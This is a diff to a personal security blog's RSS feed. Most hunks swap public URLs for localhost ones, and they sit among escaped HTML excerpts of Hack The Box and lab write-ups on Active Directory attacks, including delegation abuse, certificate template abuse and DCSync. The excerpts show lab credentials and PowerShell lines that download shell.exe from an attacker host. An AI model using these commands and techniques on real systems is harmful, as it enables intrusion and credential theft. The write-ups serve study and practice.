-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.16.&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;/shell.exe -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\users\sqlsvc\Documents&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.16.&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;/shell.exe -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\users\sqlsvc\Documents\shell.exe&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;或者
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object System.Net.WebClient).DownloadFile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://10.10.16.23:4444/shell.exe&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\users\sqlsvc\Documents\shell.exe&amp;#39;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;通用反向上传脚本uploadspy&#34;&gt;通用反向上传脚本（uploads.py）
@@ -3396,10 +3429,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>Delegate-wp</title>
-        <link>https://wackymaker.github.io/post/delegate/</link>
+        <link>http://localhost:1313/post/delegate/</link>
         <pubDate>Mon, 22 Sep 2025 12:28:33 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/delegate/</guid>
+        <guid>http://localhost:1313/post/delegate/</guid>
         <description>&lt;h2 id=&#34;前期信息收集&#34;&gt;前期信息收集
 &lt;/h2&gt;&lt;p&gt;初期分析&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/Delegate&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
@@ -3780,10 +3813,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>Redelegate-wp</title>
-        <link>https://wackymaker.github.io/post/redelegate/</link>
+        <link>http://localhost:1313/post/redelegate/</link>
         <pubDate>Sun, 21 Sep 2025 16:18:24 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/redelegate/</guid>
+        <guid>http://localhost:1313/post/redelegate/</guid>
         <description>&lt;h2 id=&#34;前期收集&#34;&gt;前期收集
 &lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/Redelegate&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ ls
@@ -4270,7 +4303,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.234.50   &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;20348&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:redelegate.vl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.234.50   &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; redelegate.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\M&lt;/span&gt;arie.Curie:Fall2024!
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;猎犬能清晰的看到我们当前获得的用户允许修改6个用户的密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Redelegate/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Redelegate/image.png&#34;
 	
 	
 	
@@ -4280,7 +4313,7 @@ linux换行&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;我一个一个顺着acl看下去发现只有HELEN.FROST是值得控制的&lt;/p&gt;
 &lt;p&gt;它的组可以对fs0l有完全控制权&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Redelegate/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Redelegate/image-1.png&#34;
 	
 	
 	
@@ -4466,10 +4499,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>baby-wp</title>
-        <link>https://wackymaker.github.io/post/baby/</link>
+        <link>http://localhost:1313/post/baby/</link>
         <pubDate>Fri, 19 Sep 2025 11:54:55 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/baby/</guid>
+        <guid>http://localhost:1313/post/baby/</guid>
         <description>&lt;h2 id=&#34;前期信息&#34;&gt;前期信息
 &lt;/h2&gt;&lt;p&gt;扫描出来是纯正的域控&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/baby&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
@@ -5163,10 +5196,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>sendai-wp</title>
-        <link>https://wackymaker.github.io/post/sendai/</link>
+        <link>http://localhost:1313/post/sendai/</link>
         <pubDate>Thu, 18 Sep 2025 21:40:42 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/sendai/</guid>
+        <guid>http://localhost:1313/post/sendai/</guid>
         <description>&lt;h2 id=&#34;初始侦察&#34;&gt;初始侦察
 &lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat rustscan.txt 
@@ -5767,10 +5800,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>ca管理员权限解析及利用发布恶意模板攻击</title>
-        <link>https://wackymaker.github.io/post/adcsmake/</link>
+        <link>http://localhost:1313/post/adcsmake/</link>
         <pubDate>Wed, 03 Sep 2025 18:42:12 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/adcsmake/</guid>
+        <guid>http://localhost:1313/post/adcsmake/</guid>
         <description>&lt;h2 id=&#34;本文导读&#34;&gt;本文导读
 &lt;/h2&gt;&lt;p&gt;pki是一种公钥认证基础，用来实现证书的发布管理等，Microsof实现的PKI被称为 Active Directory证书服务（Active Directory Certificate ServicesAD CS）其在很大程度上受到安全社区的关注。&lt;/p&gt;
 &lt;p&gt;当我们在域渗透的过程中，经常会见到pki admin或者Certificate Managers这些组，无论是实战环境还是渗透比赛，这都意味着我们可以枚举域内存在漏洞的证书模板并加以利用。&lt;/p&gt;
@@ -6409,10 +6442,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>scepter-wp</title>
-        <link>https://wackymaker.github.io/post/scepter/</link>
+        <link>http://localhost:1313/post/scepter/</link>
         <pubDate>Mon, 01 Sep 2025 20:56:42 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/scepter/</guid>
+        <guid>http://localhost:1313/post/scepter/</guid>
         <description>&lt;h2 id=&#34;靶机总结&#34;&gt;靶机总结
 &lt;/h2&gt;&lt;p&gt;使用了两次esc14，很有意思，本文技术补充以添加至血缇之书&lt;/p&gt;
 &lt;p&gt;配置如下&lt;/p&gt;
@@ -6623,7 +6656,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Querying computer: dc01.scepter.htb
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Done in 00M 19S
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Compressing output into 20250901151445_bloodhound.zip
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image.png&#34;
 	
 	
 	
@@ -6632,7 +6665,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;出站能改密码，但这个用户也不在远程管理组，改之前顺着用户往下看&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-1.png&#34;
 	
 	
 	
@@ -6641,7 +6674,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;此用户能完全掌控员工出入证这个ou，而这个ou里，或者说这个证书允许注册的用户是&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-2.png&#34;
 	
 	
 	
@@ -6650,7 +6683,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;这个用户的出站没有什么意义&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-3.png&#34;
 	
 	
 	
@@ -6915,7 +6948,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当设置altSecurityIdentities属性后，证书认证会变成弱匹配，只要证书属性中关于这个属性的值匹配一致，则允许认证&lt;/p&gt;
 &lt;h2 id=&#34;提权&#34;&gt;提权
 &lt;/h2&gt;&lt;p&gt;此用户不允许ntlm认证，请求tgt登陆winrm之前看看猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-4.png&#34;
 	
 	
 	
@@ -7064,7 +7097,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;p.adams,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Helpdesk Enrollment Certificate,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;altSecurityIdentities: WRITE
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个p.adams用户能打dcsync&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-5.png&#34;
 	
 	
 	
@@ -7150,10 +7183,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>不可转发情况下的约束委派攻击</title>
-        <link>https://wackymaker.github.io/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</link>
+        <link>http://localhost:1313/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</link>
         <pubDate>Thu, 28 Aug 2025 13:43:59 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</guid>
+        <guid>http://localhost:1313/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</guid>
         <description>&lt;p&gt;要理解不可转发约束委派为何是难以被攻击的，我们需要了解约束委派本身&lt;/p&gt;
 &lt;h2 id=&#34;约束委派简介&#34;&gt;约束委派简介
 &lt;/h2&gt;&lt;p&gt;简单来说，约束委派是域内的一种机制：允许某个账号（如sever1$)，以其他用户的身份访问特定服务（如 HTTP/dc01.corp.local）。&lt;/p&gt;
@@ -7166,7 +7199,7 @@ linux换行&lt;/p&gt;
 &lt;p&gt;实验环境如下 IP：10.129.194.21；FQDN：DC01.rebound.htb；具有委派的用户信息：delegator$/c5c2c04a2590c117fa9e1a07a110dad3，和一个普通域用户：ldap_monitor/1GR8t@$$4u&lt;/p&gt;
 &lt;p&gt;使用工具如下：impacket包&lt;/p&gt;
 &lt;p&gt;在开始攻击之前，可以通过下面看到delegator$确实配置了约束委派&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image.png&#34;
 	
 	
 	
@@ -7175,7 +7208,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;但是当我们直接请求管理员的时候会报错&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-1.png&#34;
 	
 	
 	
@@ -7185,7 +7218,7 @@ linux换行&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;其中报错点明了Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable，也就是tgt可能不存在forwardable所以不允许转发票据&lt;/p&gt;
 &lt;p&gt;这时如果我们抓取猎犬如果看到了这个机器用户存在注册服务，就像这样&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-2.png&#34;
 	
 	
 	
@@ -7197,7 +7230,7 @@ linux换行&lt;/p&gt;
 &lt;h2 id=&#34;实际操作&#34;&gt;实际操作
 &lt;/h2&gt;&lt;p&gt;具体做法如下&lt;/p&gt;
 &lt;p&gt;首先将delegator$msDS-AllowedToActOnBehalfOfOtherIdentity属性写入ldap_monitor，将其拥有对delegator$打rbcd的权限，其实也就是为了提前一步伪造为任意用户&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-3.png&#34;
 	
 	
 	
@@ -7206,7 +7239,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;利用这层身份，我们可以ldap_monitor以任意身份请求delegator$注册的服务，这里我们直接以dc的机器用户请求&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-4.png&#34;
 	
 	
 	
@@ -7215,7 +7248,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;现在我们以及完成了提前一步伪造为我们需要的用户，接下来我们就能直接拿着这张票据去请求约束委派&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-5.png&#34;
 	
 	
 	
@@ -7225,7 +7258,7 @@ linux换行&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;而这张票据就是我们成功以dc01$的身份在没有开启协议转换的情况下请求了约束委派的服务&lt;/p&gt;
 &lt;p&gt;而我们可以利用它去打dcsync，其结果证明了我们的成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-6.png&#34;
 	
 	
 	
@@ -7247,10 +7280,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>sweep-wp</title>
-        <link>https://wackymaker.github.io/post/sweep-htb/</link>
+        <link>http://localhost:1313/post/sweep-htb/</link>
         <pubDate>Wed, 27 Aug 2025 23:00:26 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/sweep-htb/</guid>
+        <guid>http://localhost:1313/post/sweep-htb/</guid>
         <description>&lt;h2 id=&#34;机器简介&#34;&gt;机器简介
 &lt;/h2&gt;&lt;p&gt;一台中等难度的dc，来自vulnhub，但是最近并入了htb，所以我乐意在闲暇时间玩一玩&lt;/p&gt;
 &lt;p&gt;机器在开始前附带信息如下&lt;/p&gt;
@@ -7363,7 +7396,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    INVENTORY        Lansweeper$                     Lansweeper Actions
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    INVENTORY        NETLOGON                        Logon server share 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;smb存在匿名，DefaultPackageShare$特殊目录当中只有一张图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image.png&#34;
 	
 	
 	
@@ -7497,7 +7530,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Done in 00M 49S
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Compressing output into 20250827100014_bloodhound.zip
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个用户没有出站，但是能看到有个额外的域管，或许后面会有用&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-1.png&#34;
 	
 	
 	
@@ -7507,7 +7540,7 @@ linux换行&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;h2 id=&#34;ssh蜜罐&#34;&gt;ssh蜜罐
 &lt;/h2&gt;&lt;p&gt;这个用户局外没什么用了，用来登陆管理平台试试&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-2.png&#34;
 	
 	
 	
@@ -7516,7 +7549,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;这个用户并不够权限执行我枚举到的后台shell利用&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-3.png&#34;
 	
 	
 	
@@ -7546,7 +7579,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO 2025/08/27 10:23:01 Host key &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/wackymaker/.local/share/sshesame/host_ed25519_key&amp;#34;&lt;/span&gt; not found, generating it
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO 2025/08/27 10:23:01 Listening on 10.10.16.22:2222
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在扫描凭证-添加扫描目标中，选择扫描ip范围，选定我们蜜罐的范围，并选择2222端口（只显示22是因为它只显示两位数字）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-4.png&#34;
 	
 	
 	
@@ -7555,7 +7588,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;并且在扫描凭据这里，将凭据映射绑定到ip范围的linux主机上，这样它就会利用保存凭证进行ssh登陆我们的蜜罐&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-5.png&#34;
 	
 	
 	
@@ -7618,7 +7651,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   INVENTORY        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;20348&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:INVENTORY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:sweep.vl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   INVENTORY        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sweep.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;vc_inventory_lnx:0|5m-U6?/uAX
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;存在权限但是没有winrm，回头这个用户的猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-6.png&#34;
 	
 	
 	
@@ -7627,7 +7660,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;有出站，可以将自己添加入LANSWEEPER ADMINS组，并且LANSWEEPER ADMINS组属于远程管理组&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-7.png&#34;
 	
 	
 	
@@ -7764,10 +7797,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>基于DnsAdmin组的dns热重载权限维持及衍生情况</title>
-        <link>https://wackymaker.github.io/post/dnsadmin/</link>
+        <link>http://localhost:1313/post/dnsadmin/</link>
         <pubDate>Mon, 25 Aug 2025 18:50:52 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/dnsadmin/</guid>
+        <guid>http://localhost:1313/post/dnsadmin/</guid>
         <description>&lt;h2 id=&#34;本文所使用环境&#34;&gt;本文所使用环境
 &lt;/h2&gt;&lt;p&gt;这篇环境当中，我使用的是我自建靶机&lt;a class=&#34;link&#34; href=&#34;https://www.wackymaker.com/post/bicher-%E8%87%AA%E5%BB%BA/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;bicker&lt;/a&gt;,其中tindalos就是dnsadmin组&lt;/p&gt;
@@ -7923,7 +7956,7 @@ linux换行&lt;/p&gt;
 &lt;h2 id=&#34;攻击路径检测难度&#34;&gt;攻击路径检测难度
 &lt;/h2&gt;&lt;p&gt;那么这种不再dnsadmin组中却对dns容器存在acl的情况是否容易检测呢？&lt;/p&gt;
 &lt;p&gt;通过猎犬，我们可以看到用户没有出站，针对性查找也无法查找，这很正常&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/dnsadmin/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/dnsadmin/image.png&#34;
 	
 	
 	
@@ -7984,10 +8017,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>bicker-wp</title>
-        <link>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</link>
+        <link>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</link>
         <pubDate>Mon, 25 Aug 2025 15:15:18 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
+        <guid>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
         <description>&lt;h2 id=&#34;信息收集&#34;&gt;信息收集
 &lt;/h2&gt;&lt;p&gt;主机确认&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/synthetic/bicker&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
@@ -8035,7 +8068,7 @@ linux换行&lt;/p&gt;
